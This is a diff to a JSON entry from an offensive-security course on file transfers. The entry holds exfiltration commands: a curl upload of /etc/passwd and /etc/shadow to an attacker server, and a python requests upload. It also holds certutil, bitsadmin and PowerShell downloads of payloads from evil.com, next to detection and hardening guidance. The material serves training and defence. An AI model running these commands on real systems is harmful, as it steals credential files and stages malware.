@@ -27,7 +27,7 @@
   "source": "CPTS Module 07: File Transfers",
   "examples": [
     {
-      "label": "CPTS Ch07 — HTTPS uploadserver + curl multi-file upload",
+      "label": "CPTS Ch07 - HTTPS uploadserver + curl multi-file upload",
       "command": "# Attacker:\nopenssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'\nsudo python3 -m uploadserver 443 --server-certificate ~/server.pem\n# Target:\ncurl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure"
     },
     {
@@ -78,7 +78,7 @@
   ],
   "exam": "exam-ok",
   "defense": {
-    "why_it_works": "Standard Linux transfer tools (scp/wget/curl over SSH/HTTP) move files onto the target using access you already have; there's no vuln — it's living-off-the-land staging.",
+    "why_it_works": "Standard Linux transfer tools (scp/wget/curl over SSH/HTTP) move files onto the target using access you already have; there's no vuln - it's living-off-the-land staging.",
     "prerequisites": "Code execution on the target, data to exfil, and an attacker endpoint reachable over an allowed protocol.",
     "impact": "Sensitive files leave the environment - a confidentiality breach and material for offline analysis.",
     "detection": "Outbound data flows to an external/unknown host, unusual for the source process; DLP/egress monitoring on sensitive content; command line (curl -F / nc) in auditd.",
@@ -95,7 +95,7 @@
     ],
     "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
     "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
     "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
   },
   "variations": [
@@ -125,7 +125,7 @@
       "label": "scp upload"
     },
     {
-      "description": "Alternative web upload — python3 requests one-liner",
+      "description": "Alternative web upload - python3 requests one-liner",
       "command": "python3 -c 'import requests;requests.post(\"http://<ip>:8000/upload\",files={\"files\":open(\"/etc/passwd\",\"rb\")})'",
       "label": "python3"
     }
